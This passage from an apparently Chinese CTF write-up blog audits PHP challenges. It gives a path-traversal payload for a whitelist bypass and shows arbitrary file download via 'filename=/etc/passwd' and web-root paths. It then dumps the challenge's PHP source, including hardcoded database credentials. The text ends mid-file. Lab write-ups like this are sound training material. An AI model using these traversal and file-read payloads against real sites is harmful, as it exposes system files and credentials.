class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第 7 行有一个 hint.php，访问得到 flag 的路径</p><blockquote><p>flag not here, and flag in ffffllllaaaagggg</p></blockquote><p>第 40 行的 if 函数，要求 file 不为空并且是字符串，还调用了 emmm 类要返回 true 才行</p><p>emmm 里面有好几个方法返回 true</p><p>首先是 <a href="https://www.w3school.com.cn/php/func_array_in_array.asp">in_array</a> 这个函数，也就是如果第一个参数在第二个参数里面出现了，为 true</p><p>再就是 <a href="https://www.php.net/manual/zh/function.mb-strpos.php">mb_strpos</a>，查找第二个参数在第一个参数里面首次出现的位置，<code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code>也就是返回 page 的长度</p><p>，第 17 行到 21 行来说，结果就是<code>_page = page</code></p><p>26 行的反序列化会彻底打乱 _page 的字符，32 行其实不好去判断，所以主要对 13 行和 22 行进行判断</p><p>综上， file 里面要有 source.php 或者 hint.php，同时还要有 flag 的地址 ffffllllaaaagggg，所以 13 行不行，只能 22 行，因为 _page 会以 ？为分隔符获取 page 的内容，因此，source.php 后面要跟一个 ？，这样 _page 的值就是 source.php，？ 再跟 ffffllllaaaagggg</p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3-2.png" alt="3-2"></p><p>由于不知道 ffffllllaaaagggg 在第几层，一个个 <code>../</code>试过去 </p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><h1 id="CISCN-2019华北Day1-Web1"><a href="#CISCN-2019华北Day1-Web1" class="headerlink" title="[CISCN 2019华北Day1]Web1"></a>[CISCN 2019华北Day1]Web1</h1><p>注册个账号进去，只有一个上传文件的功能，上传后也只能下载和删除，找不到注入点</p><p>没思路就抓包，上传文件抓了没啥东西，那就抓下载文件的包</p><p>修改 <code>filename=/etc/passwd</code></p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4-1.png" alt="4-1"></p><p>发现能过读取文件，再想着一开始在 F12 里面看到的几个 php 文件，想必也能读取出来</p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4-2.png" alt="4-2"></p><p><code>filename=/var/www/html/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Name</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Size</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>filename=/var/www/html/login.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;register&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;娉ㄥ唽鎴愬姛&#x27;, &#x27;info&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">20</span> &amp;&amp; <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">verify_user</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$sandbox</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">sha1</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot;sftUahRiTz&quot;</span>) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$sandbox</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>] = <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;璐﹀彿鎴栧瘑鐮侀敊璇�&#x27;, &#x27;warning&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>filename=/var/www/html/class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;涓嬭浇&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>filename=/var/www/html/upload.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$pos</span> = <span class="title function_ invoke__">strrpos</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>, <span class="number">0</span>, <span class="variable">$pos</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$fileext</span> = <span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;image/gif&#x27;</span>:</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;image/jpeg&#x27;</span>:</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;image/png&#x27;</span>:</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span 